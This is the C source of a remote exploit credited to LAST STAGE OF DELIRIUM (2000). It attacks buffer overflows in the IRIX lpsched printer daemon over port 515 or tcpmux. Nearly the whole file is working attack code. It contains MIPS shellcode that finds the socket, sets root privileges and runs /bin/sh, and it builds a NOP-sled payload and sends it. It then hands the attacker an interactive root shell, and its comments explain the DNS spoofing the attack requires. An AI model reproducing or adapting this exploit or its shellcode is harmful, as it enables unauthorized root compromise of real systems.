/*## copyright LAST STAGE OF DELIRIUM may 2000 poland        *://lsd-pl.net/ #*/
/*## lpsched                                                                 #*/

/*   lpsched usually runs on TCP port 515. sometimes it is not bound to this  */
/*   port - in such case lpsched can be reached through tcpmux/sgi_printer    */
/*   (port 1) and printerd. this code exploits one of several buffer overflow */
/*   vulnerabilities that exist in the lpsched code. as a result of its use   */
/*   against a vulnerable system, the interactive shell is executed under the */
/*   privilages of the root user.                                             */
 
/*   remote exploitation requires that a connection is established from the   */
/*   root account (port<1024) and that a proper modification to the DNS       */
/*   is made, so that the attackers' IP address is mapped to the "localhost"  */
/*   name.                                                                    */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

#define NOPNUM 2700
#define ADRNUM 1040

char findsckcode[]=
    "\x04\x10\xff\xff"     /* bltzal  $zero,<findsckcode>    */
    "\x24\x10\x01\x90"     /* li      $s0,400                */
    "\x22\x11\x01\x9c"     /* addi    $s1,$s0,412            */
    "\x22\x0d\xfe\x94"     /* addi    $t5,$s0,-(400-36)      */
    "\x03\xed\x68\x20"     /* add     $t5,$ra,$t5            */
    "\x01\xa0\xf0\x09"     /* jalr    $s8,$t5                */
    "\x97\xeb\xff\xc2"     /* lhu     $t3,-62($ra)           */
    "\x24\x0c\x12\x34"     /* li      $t4,0x1234             */
    "\x01\x6c\x58\x23"     /* subu    $t3,$t3,$t4            */
    "\x22\x0d\xfe\xbc"     /* addi    $t5,$s0,-(400-76)      */
    "\x11\x60\xff\xf9"     /* beqz    $t3,<findsckcode+16>   */
    "\x22\x24\xfe\xd4"     /* addi    $a0,$s1,-300           */
    "\x23\xe5\xff\xc0"     /* addi    $a1,$ra,-64            */
    "\x23\xe6\xff\xfc"     /* addi    $a2,$ra,-4             */
    "\x24\x02\x04\x45"     /* li      $v0,1093               */
    "\x03\xff\xff\xcc"     /* syscall                        */
    "\x22\x31\xff\xff"     /* addi    $s1,$s1,-1             */
    "\x10\xe0\xff\xf4"     /* beqz    $a3,<findsckcode+24>   */
    "\x22\x2b\xfe\xd4"     /* addi    $t3,$s1,-300           */
    "\x1d\x60\xff\xf7"     /* bgzt    $t3,<findsckcode+44>   */
    "\x22\x04\xfe\x72"     /* addi    $a0,$s0,-398           */
    "\x24\x02\x03\xee"     /* li      $v0,1006               */
    "\x03\xff\xff\xcc"     /* syscall                        */
    "\x22\x24\xfe\xd5"     /* addi    $a0,$s1,-299           */
    "\x24\x02\x04\x11"     /* li      $v0,1041               */
    "\x03\xff\xff\xcc"     /* syscall                        */
    "\x22\x10\xff\xff"     /* addi    $s0,$s0,-1             */
    "\x22\x0b\xfe\x72"     /* addi    $t3,$s0,-398           */
    "\x05\x61\xff\xf7"     /* bgez    $t3,<findsckcode+80>   */
;

char setreuidcode[]=
    "\x24\x02\x04\x01"     /* li      $v0,1024+1             */
    "\x20\x42\xff\xff"     /* addi    $v0,$v0,-1             */
    "\x03\xff\xff\xcc"     /* syscall                        */
    "\x30\x44\xff\xff"     /* andi    $a0,$v0,0xffff         */
    "\x30\x05\xff\xff"     /* andi    $a1,$zero,0xffff       */
    "\x24\x02\x04\x64"     /* li      $v0,1124               */
    "\x03\xff\xff\xcc"     /* syscall                        */
;

char shellcode[]=
    "\x04\x10\xff\xff"     /* bltzal  $zero,<shellcode>      */
    "\x24\x02\x03\xf3"     /* li      $v0,1011               */
    "\x23\xff\x01\x14"     /* addi    $ra,$ra,276            */
    "\x23\xe4\xff\x08"     /* addi    $a0,$ra,-248           */
    "\x23\xe5\xff\x10"     /* addi    $a1,$ra,-220           */
    "\xaf\xe4\xff\x10"     /* sw      $a0,-220($ra)          */
    "\xaf\xe0\xff\x14"     /* sw      $zero,-236($ra)        */
    "\xa3\xe0\xff\x0f"     /* sb      $zero,-241($ra)        */
    "\x03\xff\xff\xcc"     /* syscall                        */
    "/bin/sh"
;

char nop[]="\x24\x0f\x12\x34";

main(int argc,char **argv){
    char buffer[10000],address[4],*b;
    int sck,sck2,i,c,n,on=1,tcpmux=0;
    struct sockaddr_in adr;
    struct hostent *hp;

    printf("copyright LAST STAGE OF DELIRIUM may 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/lpsched for irix 6.2 6.3 IP:22\n\n");

    if(argc<2){
        printf("usage: %s address [-m]\n",argv[0]);exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"m"))!=-1){
        switch(c){
        case 'm': tcpmux=1;
        }
    }

    *(unsigned int*)address=0x7fff1f60+1300;

    printf("adr=0x%08x ",ntohl(*(unsigned long*)address));
    fflush(stdout);

    sck=socket(AF_INET,SOCK_STREAM,0);
    adr.sin_family=AF_INET;
    adr.sin_addr.s_addr=htonl(INADDR_ANY);
    for(i=513;i<1024;i++){
        if(!(i&0xff)) continue;
        adr.sin_port=htons(i);
        if(!bind(sck,(struct sockaddr*)&adr,sizeof(adr))) break;
    }if(i==1024) goto err; 
    n=i;

    sck2=socket(AF_INET,SOCK_STREAM,0);
    for(i=200;i<1024;i++){
        adr.sin_port=htons(i);
        if(!bind(sck2,(struct sockaddr*)&adr,sizeof(adr))) break;
    }if(i==1024) goto err;

    setsockopt(sck,SOL_SOCKET,SO_REUSEADDR,(void*)&on,sizeof(on));
    setsockopt(sck2,SOL_SOCKET,SO_REUSEADDR,(void*)&on,sizeof(on));

    adr.sin_family=AF_INET;
    adr.sin_port=htons(tcpmux?1:515);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL) {errno=EADDRNOTAVAIL;goto err;}
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }

    if(connect(sck2,(struct sockaddr*)&adr,sizeof(adr))<0) goto err;
    if(tcpmux) {write(sck2,"sgi_printer\n",12);read(sck2,buffer,1024);}
    printf("port=%d connected! ",n);fflush(stdout);

    findsckcode[28+2]=(char)((n&0xff00)>>8);
    findsckcode[28+3]=(char)(n&0xff);

    b=buffer;
    sprintf(b,"\x01   ");b+=4;
    for(i=0;i<ADRNUM;i++) *b++=' ';
    for(i=0;i<NOPNUM-(tcpmux?600:0);i++) *b++=nop[i%4];
    for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
    for(i=0;i<strlen(setreuidcode);i++) *b++=setreuidcode[i];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b++='\n';
    *b=0;
    write(sck2,buffer,strlen(buffer));
    close(sck2);
    printf("sent! ");
    sleep(1);

    if(connect(sck,(struct sockaddr*)&adr,sizeof(adr))<0) goto err;
    if(tcpmux) {write(sck,"sgi_printer\n",12);read(sck,buffer,1024);}

    b=buffer;
    sprintf(b,"T  ");b+=3;
    for(i=0;i<ADRNUM;i++) *b++=address[i%4];
    *b++='\n';
    *b=0;
    write(sck,buffer,strlen(buffer));
    printf("sent!\n");

    write(sck,"uname -a\n",9);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
    exit(0);

err:
    perror("error");
}

